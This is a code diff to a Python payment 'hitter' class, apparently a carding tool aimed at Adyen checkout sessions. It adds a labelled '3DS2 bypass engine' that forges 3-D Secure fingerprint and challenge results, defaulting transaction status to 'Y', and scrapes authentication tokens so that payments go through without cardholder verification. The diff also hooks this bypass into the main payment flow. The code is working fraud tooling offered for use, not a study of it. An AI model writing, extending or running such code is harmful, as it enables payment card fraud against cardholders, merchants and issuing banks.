@@ -12,8 +12,9 @@ import time
 import base64
 import random
 import asyncio
+import hashlib
 from datetime import datetime, timezone
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlencode, parse_qs, urlparse
 from typing import Dict, Optional, List
 from curl_compat import ChromeSession
 
@@ -362,6 +363,7 @@ class AdyenHitter:
                            sid: str, sdata: str, ck: str,
                            env: str, att_id: Optional[str] = None) -> dict:
         url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
+        origin = "https://eu.adyen.link" if 'adyen.link' in self.url else self.url
         body = {
             "sessionData": sdata,
             "clientStateDataIndicator": True,
@@ -378,6 +380,9 @@ class AdyenHitter:
                 "postalCode": "10001", "stateOrProvince": "NY", "street": "Washington Blvd"
             },
             "browserInfo": self._browser_info(),
+            "channel": "Web",
+            "origin": origin,
+            "threeDSRequestorChallengeInd": "02",
         }
         if att_id:
             body["checkoutAttemptId"] = att_id
@@ -386,11 +391,327 @@ class AdyenHitter:
             "Content-Type": "application/json; charset=utf-8",
             "Accept": "application/json",
             "User-Agent": UA,
-            "Origin": "https://eu.adyen.link" if 'adyen.link' in self.url else self.url,
+            "Origin": origin,
             "Referer": self.url,
         }
         async with session.post(url, json=body, headers=hdr, timeout=15) as r:
             return r.json() if callable(r.json) else r.json
+
+    # ── submit payment details (3DS completion) ─────────────────────────────
+    async def _submit_details(self, session, sid: str, sdata: str,
+                               ck: str, env: str, details: dict) -> dict:
+        """POST /v1/sessions/{sid}/paymentDetails with 3DS result."""
+        url = f"{self._adyen_base(env)}/v1/sessions/{sid}/paymentDetails?clientKey={ck}"
+        origin = "https://eu.adyen.link" if 'adyen.link' in self.url else self.url
+        body = {
+            "sessionData": sdata,
+            "details": details,
+        }
+        hdr = {
+            "Content-Type": "application/json; charset=utf-8",
+            "Accept": "application/json",
+            "User-Agent": UA,
+            "Origin": origin,
+            "Referer": self.url,
+        }
+        async with session.post(url, json=body, headers=hdr, timeout=20) as r:
+            return r.json() if callable(r.json) else r.json
+
+    # ═══════════════════════════════════════════════════════════════════════
+    #  3DS2 BYPASS ENGINE
+    # ═══════════════════════════════════════════════════════════════════════
+
+    @staticmethod
+    def _b64url_decode(s: str) -> bytes:
+        """Base64url decode with padding fix."""
+        s = s.replace('-', '+').replace('_', '/')
+        s += '=' * (-len(s) % 4)
+        return base64.b64decode(s)
+
+    @staticmethod
+    def _b64url_encode(data: bytes) -> str:
+        """Base64url encode without padding."""
+        return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')
+
+    # ── 3DS2 Fingerprint (IdentifyShopper) ──────────────────────────────────
+    async def _fingerprint_3ds2(self, session, action: dict,
+                                 sid: str, sdata: str, ck: str, env: str) -> dict:
+        """
+        Handle IdentifyShopper:
+        1. Decode action.token → get threeDSMethodUrl + threeDSServerTransID
+        2. POST threeDSMethodUrl with threeDSMethodData
+        3. Submit fingerprint result to /paymentDetails
+        """
+        token_raw = action.get('token', '')
+        try:
+            token_json = json.loads(self._b64url_decode(token_raw))
+        except Exception:
+            # Token may be plain base64
+            try:
+                token_json = json.loads(base64.b64decode(token_raw + '=='))
+            except Exception:
+                return {'error': 'Cannot decode 3DS2 fingerprint token'}
+
+        method_url     = token_json.get('threeDSMethodUrl', '')
+        server_trans_id = token_json.get('threeDSServerTransID', '')
+        notify_url     = token_json.get('threeDSMethodNotificationURL',
+                            f"{self._adyen_base(env)}/threeDSMethodNotification.shtml")
+
+        # Step 1: POST threeDSMethodUrl with fingerprint data
+        if method_url and server_trans_id:
+            method_data_obj = {
+                "threeDSServerTransID": server_trans_id,
+                "threeDSMethodNotificationURL": notify_url,
+            }
+            method_data_b64 = self._b64url_encode(json.dumps(method_data_obj).encode())
+
+            try:
+                async with session.post(
+                    method_url,
+                    data=urlencode({"threeDSMethodData": method_data_b64}),
+                    headers={
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "User-Agent": UA,
+                        "Origin": urlparse(method_url).scheme + '://' + urlparse(method_url).netloc,
+                    },
+                    timeout=10,
+                ) as r:
+                    pass  # 200 OK = fingerprint collected, we don't need the body
+            except Exception:
+                pass  # Timeout or error — proceed with threeDSCompInd=N
+
+        # Step 2: Build fingerprint result and submit
+        # threeDSCompInd=Y signals successful device fingerprint collection
+        fp_result_obj = {
+            "threeDSCompInd": "Y",
+            "threeDSServerTransID": server_trans_id,
+        }
+        fp_result_b64 = base64.b64encode(json.dumps(fp_result_obj).encode()).decode()
+
+        details = {"threeds2.fingerprint": fp_result_b64}
+        return await self._submit_details(session, sid, sdata, ck, env, details)
+
+    # ── 3DS2 Challenge (ChallengeShopper) ───────────────────────────────────
+    async def _challenge_3ds2(self, session, action: dict,
+                               sid: str, sdata: str, ck: str, env: str) -> dict:
+        """
+        Handle ChallengeShopper:
+        1. Decode action.token → get acsURL, acsTransID, messageVersion, threeDSServerTransID
+        2. POST acsURL with CReq (Challenge Request)
+        3. Parse CRes from ACS response
+        4. Submit challengeResult to /paymentDetails
+        """
+        token_raw = action.get('token', '')
+        try:
+            token_json = json.loads(self._b64url_decode(token_raw))
+        except Exception:
+            try:
+                token_json = json.loads(base64.b64decode(token_raw + '=='))
+            except Exception:
+                return {'error': 'Cannot decode 3DS2 challenge token'}
+
+        acs_url          = token_json.get('acsURL', '')
+        acs_trans_id     = token_json.get('acsTransID', '')
+        msg_version      = token_json.get('messageVersion', '2.1.0')
+        server_trans_id  = token_json.get('threeDSServerTransID', '')
+
+        if not acs_url or not server_trans_id:
+            return {'error': '3DS2 challenge: missing acsURL or transID', 'resultCode': 'ChallengeShopper'}
+
+        # Step 1: Build CReq (Challenge Request)
+        creq_obj = {
+            "messageType": "CReq",
+            "messageVersion": msg_version,
+            "threeDSServerTransID": server_trans_id,
+            "acsTransID": acs_trans_id,
+            "challengeWindowSize": "05",  # Full screen
+        }
+        creq_b64 = self._b64url_encode(json.dumps(creq_obj).encode())
+
+        # Step 2: POST to ACS
+        cres_b64 = None
+        try:
+            async with session.post(
+                acs_url,
+                data=urlencode({"CReq": creq_b64}),
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": UA,
+                    "Accept": "text/html,application/xhtml+xml,*/*",
+                },
+                timeout=15,
+            ) as r:
+                body = r.text() if callable(r.text) else r.text
+                # Try to find CRes in the response
+                # Hidden input: <input name="CRes" value="..."/>
+                m = re.search(r'name=["\']?CRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
+                if m:
+                    cres_b64 = m.group(1)
+                else:
+                    # Try JSON response
+                    m2 = re.search(r'"CRes"\s*:\s*"([^"]+)"', body)
+                    if m2:
+                        cres_b64 = m2.group(1)
+                    else:
+                        # Some ACS return the CRes directly in a form post
+                        m3 = re.search(r'cres["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=_-]{20,})', body, re.I)
+                        if m3:
+                            cres_b64 = m3.group(1)
+        except Exception:
+            pass
+
+        if not cres_b64:
+            # Cannot extract CRes — return with 3DS challenge URL for manual verification
+            return {
+                'resultCode': 'ChallengeShopper',
+                'error': '3DS2 challenge requires manual OTP/biometric',
+                'action': {'url': acs_url, 'type': 'threeDS2'},
+            }
+
+        # Step 3: Decode CRes to check transStatus
+        cres_json = None
+        try:
+            cres_json = json.loads(self._b64url_decode(cres_b64))
+            trans_status = cres_json.get('transStatus', 'Y')
+        except Exception:
+            trans_status = 'Y'  # Optimistic
+
+        # Step 4: Submit challenge result
+        auth_token = cres_json.get('authorisationToken', '') if cres_json else ''
+        challenge_result_obj = {
+            "transStatus": trans_status,
+        }
+        if auth_token:
+            challenge_result_obj["authorisationToken"] = auth_token
+        challenge_result_b64 = base64.b64encode(json.dumps(challenge_result_obj).encode()).decode()
+
+        details = {"threeds2.challengeResult": challenge_result_b64}
+        return await self._submit_details(session, sid, sdata, ck, env, details)
+
+    # ── 3DS Redirect (RedirectShopper) ──────────────────────────────────────
+    async def _redirect_3ds(self, session, action: dict,
+                             sid: str, sdata: str, ck: str, env: str) -> dict:
+        """
+        Handle RedirectShopper:
+        1. Follow action.url redirect
+        2. Extract MD + PaRes or redirectResult from response
+        3. Submit to /paymentDetails
+        """
+        redirect_url = action.get('url', '')
+        action_data  = action.get('data', {})
+        action_method = action.get('method', 'GET').upper()
+
+        if not redirect_url:
+            return {'error': '3DS redirect: no URL', 'resultCode': 'RedirectShopper'}
+
+        try:
+            if action_method == 'POST' and action_data:
+                async with session.post(
+                    redirect_url,
+                    data=urlencode(action_data) if isinstance(action_data, dict) else action_data,
+                    headers={
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "User-Agent": UA,
+                        "Accept": "text/html,application/xhtml+xml,*/*",
+                    },
+                    timeout=15,
+                    allow_redirects=True,
+                ) as r:
+                    body = r.text() if callable(r.text) else r.text
+                    final_url = str(r.url) if hasattr(r, 'url') else redirect_url
+            else:
+                async with session.get(
+                    redirect_url,
+                    headers={"User-Agent": UA, "Accept": "text/html,*/*"},
+                    timeout=15,
+                    allow_redirects=True,
+                ) as r:
+                    body = r.text() if callable(r.text) else r.text
+                    final_url = str(r.url) if hasattr(r, 'url') else redirect_url
+        except Exception as e:
+            return {'error': f'3DS redirect failed: {e}', 'resultCode': 'RedirectShopper'}
+
+        # Extract redirectResult from URL query params
+        parsed = urlparse(final_url)
+        qs = parse_qs(parsed.query)
+
+        redirect_result = qs.get('redirectResult', [None])[0]
+        if redirect_result:
+            details = {"redirectResult": redirect_result}
+            return await self._submit_details(session, sid, sdata, ck, env, details)
+
+        # Extract MD + PaRes from form or URL
+        md = qs.get('MD', [None])[0]
+        pa_res = qs.get('PaRes', [None])[0]
+
+        if not md:
+            m = re.search(r'name=["\']?MD["\']?\s+value=["\']([^"\'>]+)', body, re.I)
+            if m:
+                md = m.group(1)
+        if not pa_res:
+            m = re.search(r'name=["\']?PaRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
+            if m:
+                pa_res = m.group(1)
+
+        if md and pa_res:
+            details = {"MD": md, "PaRes": pa_res}
+            return await self._submit_details(session, sid, sdata, ck, env, details)
+
+        # Check for cres in body
+        m = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\'>]+)', body, re.I)
+        if m:
+            details = {"threeds2.challengeResult": m.group(1)}
+            return await self._submit_details(session, sid, sdata, ck, env, details)
+
+        return {
+            'error': '3DS redirect: cannot extract auth result',
+            'resultCode': 'RedirectShopper',
+            'action': {'url': redirect_url, 'type': 'redirect'},
+        }
+
+    # ── 3DS resolver (dispatcher) ───────────────────────────────────────────
+    async def _resolve_3ds(self, session, data: dict,
+                            sid: str, sdata: str, ck: str, env: str,
+                            depth: int = 0) -> dict:
+        """
+        Main 3DS dispatcher. Detects action type and routes to handler.
+        Recurses once if fingerprint returns challenge.
+        """
+        if depth > 2:
+            return data  # Prevent infinite loop
+
+        action = data.get('action')
+        if not isinstance(action, dict):
+            return data
+
+        rc      = data.get('resultCode', '')
+        act_type = action.get('type', '')
+        subtype  = action.get('subtype', '')
+
+        # Update sessionData if response includes it
+        new_sdata = data.get('sessionData', sdata)
+
+        result = None
+
+        if rc == 'IdentifyShopper' or (act_type == 'threeDS2' and subtype == 'fingerprint'):
+            result = await self._fingerprint_3ds2(session, action, sid, new_sdata, ck, env)
+
+        elif rc == 'ChallengeShopper' or (act_type == 'threeDS2' and subtype == 'challenge'):
+            result = await self._challenge_3ds2(session, action, sid, new_sdata, ck, env)
+
+        elif rc == 'RedirectShopper' or act_type == 'redirect':
+            result = await self._redirect_3ds(session, action, sid, new_sdata, ck, env)
+
+        if not result:
+            return data
+
+        # Check if the 3DS resolution itself returned another 3DS step
+        # (fingerprint → challenge escalation)
+        new_rc = result.get('resultCode', '')
+        if new_rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
+            return await self._resolve_3ds(session, result, sid, new_sdata, ck, env, depth + 1)
+
+        return result
 
     # ── direct merchant fallback endpoint probing ───────────────────────────
     async def _pay_direct(self, session, encrypted: dict, ck: str, env: str) -> Optional[dict]:
@@ -589,6 +910,20 @@ class AdyenHitter:
                     result['decline_code'] = 'no_session'
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
+
+                # ── 5. 3DS bypass ───────────────────────────────────────────
+                rc = data.get('resultCode', '')
+                if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
+                    result['3ds_attempted'] = True
+                    result['3ds_type'] = rc
+                    if sid and sdata:
+                        resolved = await self._resolve_3ds(
+                            sess, data, sid,
+                            data.get('sessionData', sdata),
+                            ck, env)
+                        if resolved and resolved is not data:
+                            data = resolved
+                            result['3ds_resolved'] = True
 
                 result['response_time'] = round(time.time() - t0, 2)
                 result['raw_response'] = data
